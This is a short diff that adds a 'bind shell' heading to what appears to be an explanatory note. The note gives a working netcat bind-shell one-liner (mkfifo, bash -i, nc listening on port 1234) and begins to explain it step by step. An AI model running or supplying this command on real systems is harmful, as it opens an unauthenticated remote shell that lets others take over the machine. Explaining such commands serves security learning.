@@ -1,3 +1,5 @@
+# bind shell
+
 > rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
 
 rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f This ensures that the script can create a new named pipe without conflicts.
